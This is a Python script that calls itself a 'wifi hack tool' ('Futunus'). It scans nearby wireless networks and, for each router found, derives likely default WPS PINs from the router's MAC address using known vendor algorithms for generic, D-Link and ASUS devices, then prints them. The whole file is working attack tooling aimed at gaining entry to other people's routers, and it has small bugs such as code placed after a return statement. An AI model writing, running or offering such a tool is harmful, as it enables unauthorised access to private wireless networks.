

import pywifi
from comtypes import GUID
import time
from math import floor
from rich.console import Console
from rich.panel import Panel
from rich import box


console = Console()
logo = '''  █████▒█    ██ ▄▄▄█████▓ █    ██  ███▄    █  █    ██   ██████ 
▓██   ▒ ██  ▓██▒▓  ██▒ ▓▒ ██  ▓██▒ ██ ▀█   █  ██  ▓██▒▒██    ▒ 
▒████ ░▓██  ▒██░▒ ▓██░ ▒░▓██  ▒██░▓██  ▀█ ██▒▓██  ▒██░░ ▓██▄   
░▓█▒  ░▓▓█  ░██░░ ▓██▓ ░ ▓▓█  ░██░▓██▒  ▐▌██▒▓▓█  ░██░  ▒   ██▒
░▒█░   ▒▒█████▓   ▒██▒ ░ ▒▒█████▓ ▒██░   ███░▒▒█████▓ ▒██████▒▒'''
info = '''
[green]Futunus - wifi hack tool[/]
[green]Made by:[/] [cyan]SLASH-02[/]
[green]Team:[/] [cyan]The361[/]
'''.strip()


def checksum(mac):
  mac %= 10000000
  var = 0
  temp = mac
  while temp:
    var += 3 * (temp % 10)
    temp = floor(temp / 10)
    var += temp % 10
    temp = floor(temp / 10)
  return (mac * 10) + ((10 - (var % 10)) % 10)
def get():
    
    One = Two = (int(MAC, 16) & 0xFFFFFF) % 10000000
    Var1 = 0
    while Two:
        Var1 += 3 * (Two % 10)
        Two = floor(Two / 10)
        Var1 += Two % 10
        Two = floor(Two / 10)
    Var2 = (One * 10) + ((10 - (Var1 % 10)) % 10)
    Var3 = str(int(Var2))
    result = Var3.zfill(8)
    print(result)

def pin24(BSSID):
  temp = int(BSSID,16) & 0xFFFFFF
  temp = checksum(temp)
  temp = str(int(temp))
  return temp.zfill(8)
def pinDLink(BSSID):
  temp = (int(BSSID, 16) & 0xFFFFFF) ^ 0x55AA55
  temp ^= ((temp & 0xF) << 4) | ((temp & 0xF) << 8) | ((temp & 0xF) << 12) | ((temp & 0xF) << 16) | ((temp & 0xF) << 20)
  temp %= 10000000
  if temp < 1000000:
    temp += ((temp % 9) * 1000000) + 1000000
  temp = checksum(temp)
  temp = str(int(temp))
  print(temp)

  return temp.zfill(8)
def pinDLinkInc1(BSSID):
  temp = int(BSSID, 16) + 1
  return pinDLink(hex(temp))
  print(temp)

def pinASUS(BSSID):
  temp = format(int(BSSID, 16), '02x')
  temp = str(temp).zfill(12)
  var = [int(temp[0:2], 16), int(temp[2:4], 16), int(temp[4:6], 16), int(temp[6:8], 16),
     int(temp[8:10], 16), int(temp[10:12], 16)]
  pin = []
  for i in range(7):
    pin.append((var[i % 6] + var[5]) % (10 - ((i + var[1] + var[2] + var[3] + var[4] + var[5]) % 7)))
  temp = int(''.join(str(i) for i in pin))
  temp = checksum(temp)
  temp = str(int(temp))
  print(temp)
  return temp.zfill(8)






wifi = pywifi.PyWiFi()
iface = wifi.interfaces()[0]
#це кароче сканить на роутери
iface.scan()
time.sleep(2) #    
result=iface.scan_results()
#цикл для виводу сідів та мак адрес роутерів

console.print(logo, style='red')

console.print(Panel.fit(("[1]Start \n[2]Info")))
while True:
    choice = int(console.input('[blink magenta]{%}>[/]'))

    if choice == 1:
        for i in range(len(result)):
            MAC = result[i].bssid.replace(':', '')   
            console.print(f'[green]{result[i].ssid}[/] [cyan]{result[i].bssid}[/]')

            get()
            pin24(MAC.upper())
            pinDLink(MAC.upper())
            pinASUS(MAC.upper())
            pinDLinkInc1(MAC.upper())
    elif choice == 2:
        console.print(Panel.fit(info, box=box.ASCII))